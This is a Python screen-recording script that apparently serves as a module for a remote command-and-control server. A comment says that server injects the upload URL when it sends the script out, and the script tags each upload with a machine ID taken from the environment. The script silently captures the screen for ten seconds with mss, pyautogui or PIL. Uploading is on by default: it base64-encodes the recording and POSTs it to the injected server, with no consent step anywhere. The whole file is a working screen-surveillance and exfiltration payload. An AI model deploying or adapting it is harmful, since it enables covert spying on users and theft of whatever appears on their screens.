"""
Screen Recorder
Records screen for specified duration and saves to file
Optionally uploads to server
"""
import os
import sys
import time
import tempfile
from datetime import datetime

# Configuration
DURATION = 10  # Recording duration in seconds
FPS = 5  # Frames per second
UPLOAD_TO_SERVER = True  # Upload recording to X1 server


def record_screen_pil(duration, fps, output_path):
    """Record screen using PIL/Pillow."""
    try:
        from PIL import ImageGrab
        import imageio
        
        print(f"[*] Recording with PIL for {duration}s at {fps} FPS...")
        
        frames = []
        frame_interval = 1.0 / fps
        start_time = time.time()
        frame_count = 0
        
        while time.time() - start_time < duration:
            frame_start = time.time()
            
            # Capture screen
            screenshot = ImageGrab.grab()
            
            # Convert to numpy array for imageio
            import numpy as np
            frame = np.array(screenshot)
            # Convert RGBA to RGB if needed
            if frame.shape[2] == 4:
                frame = frame[:, :, :3]
            frames.append(frame)
            frame_count += 1
            
            # Progress
            elapsed = time.time() - start_time
            print(f"\r    Recording: {elapsed:.1f}s / {duration}s ({frame_count} frames)", end='', flush=True)
            
            # Wait for next frame
            elapsed_frame = time.time() - frame_start
            if elapsed_frame < frame_interval:
                time.sleep(frame_interval - elapsed_frame)
        
        print(f"\n[*] Saving {len(frames)} frames to video...")
        
        # Save as GIF or MP4
        if output_path.endswith('.gif'):
            imageio.mimsave(output_path, frames, fps=fps)
        else:
            imageio.mimsave(output_path, frames, fps=fps, codec='libx264')
        
        return True
    except ImportError as e:
        print(f"[-] Missing dependency: {e}")
        print("    Install: pip install pillow imageio imageio-ffmpeg")
        return False
    except Exception as e:
        print(f"[-] Recording error: {e}")
        return False


def record_screen_pyautogui(duration, fps, output_path):
    """Record screen using pyautogui."""
    try:
        import pyautogui
        import cv2
        import numpy as np
        
        print(f"[*] Recording with PyAutoGUI for {duration}s at {fps} FPS...")
        
        # Get screen size
        screen_size = pyautogui.size()
        
        # Video writer
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(output_path, fourcc, fps, screen_size)
        
        frame_interval = 1.0 / fps
        start_time = time.time()
        frame_count = 0
        
        while time.time() - start_time < duration:
            frame_start = time.time()
            
            # Capture screen
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            
            out.write(frame)
            frame_count += 1
            
            # Progress
            elapsed = time.time() - start_time
            print(f"\r    Recording: {elapsed:.1f}s / {duration}s ({frame_count} frames)", end='', flush=True)
            
            # Wait for next frame
            elapsed_frame = time.time() - frame_start
            if elapsed_frame < frame_interval:
                time.sleep(frame_interval - elapsed_frame)
        
        out.release()
        print(f"\n[*] Saved {frame_count} frames")
        return True
    except ImportError as e:
        print(f"[-] Missing dependency: {e}")
        print("    Install: pip install pyautogui opencv-python numpy")
        return False
    except Exception as e:
        print(f"[-] Recording error: {e}")
        return False


def record_screen_mss(duration, fps, output_path):
    """Record screen using mss (fastest method)."""
    try:
        import mss
        import cv2
        import numpy as np
        
        print(f"[*] Recording with MSS for {duration}s at {fps} FPS...")
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            
            # Video writer
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter(output_path, fourcc, fps, 
                                (monitor['width'], monitor['height']))
            
            frame_interval = 1.0 / fps
            start_time = time.time()
            frame_count = 0
            
            while time.time() - start_time < duration:
                frame_start = time.time()
                
                # Capture screen
                screenshot = sct.grab(monitor)
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                
                out.write(frame)
                frame_count += 1
                
                # Progress
                elapsed = time.time() - start_time
                print(f"\r    Recording: {elapsed:.1f}s / {duration}s ({frame_count} frames)", end='', flush=True)
                
                # Wait for next frame
                elapsed_frame = time.time() - frame_start
                if elapsed_frame < frame_interval:
                    time.sleep(frame_interval - elapsed_frame)
            
            out.release()
            print(f"\n[*] Saved {frame_count} frames")
            return True
    except ImportError as e:
        print(f"[-] Missing dependency: {e}")
        print("    Install: pip install mss opencv-python numpy")
        return False
    except Exception as e:
        print(f"[-] Recording error: {e}")
        return False


def upload_to_server(filepath):
    """Upload recording to X1 server."""
    try:
        import urllib.request
        import json
        import base64
        
        # SERVER_URL will be injected by the server when sending the script
        try:
            SERVER_URL
        except NameError:
            print("ERROR: SERVER_URL not set. Server should inject this variable.")
            return
        PC_ID = os.environ.get("CC_PC_ID", "unknown")
        
        print(f"[*] Uploading to server: {SERVER_URL}")
        
        # Read file
        with open(filepath, 'rb') as f:
            content = f.read()
        
        # Encode
        content_base64 = base64.b64encode(content).decode('utf-8')
        
        # Upload
        upload_data = {
            "pc_id": PC_ID,
            "filename": os.path.basename(filepath),
            "content_base64": content_base64,
            "original_path": filepath
        }
        
        data = json.dumps(upload_data).encode('utf-8')
        req = urllib.request.Request(
            f"{SERVER_URL}/upload/base64",
            data=data,
            headers={"Content-Type": "application/json"}
        )
        
        with urllib.request.urlopen(req, timeout=120) as response:
            result = json.loads(response.read().decode('utf-8'))
            print(f"[+] Uploaded successfully!")
            print(f"    File ID: {result.get('file_id', 'unknown')}")
            return True
    except Exception as e:
        print(f"[-] Upload failed: {e}")
        return False


def main():
    print("=" * 60)
    print("SCREEN RECORDER")
    print("=" * 60)
    print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Duration: {DURATION}s | FPS: {FPS}")
    
    # Output path
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_path = os.path.join(tempfile.gettempdir(), f'screen_recording_{timestamp}.mp4')
    
    # Try different recording methods
    success = False
    
    # Try MSS first (fastest)
    print("\n[*] Trying MSS method...")
    success = record_screen_mss(DURATION, FPS, output_path)
    
    # Try PyAutoGUI
    if not success:
        print("\n[*] Trying PyAutoGUI method...")
        success = record_screen_pyautogui(DURATION, FPS, output_path)
    
    # Try PIL
    if not success:
        output_path = output_path.replace('.mp4', '.gif')
        print("\n[*] Trying PIL method (GIF output)...")
        success = record_screen_pil(DURATION, FPS, output_path)
    
    if success and os.path.exists(output_path):
        file_size = os.path.getsize(output_path)
        print(f"\n[+] Recording saved!")
        print(f"    Path: {output_path}")
        print(f"    Size: {file_size / (1024*1024):.2f} MB")
        
        # Upload if enabled
        if UPLOAD_TO_SERVER:
            print("\n[*] Uploading to server...")
            upload_to_server(output_path)
    else:
        print("\n[-] Recording failed!")
        print("    Make sure you have the required dependencies installed:")
        print("    pip install mss opencv-python numpy pillow imageio")


if __name__ == '__main__':
    main()

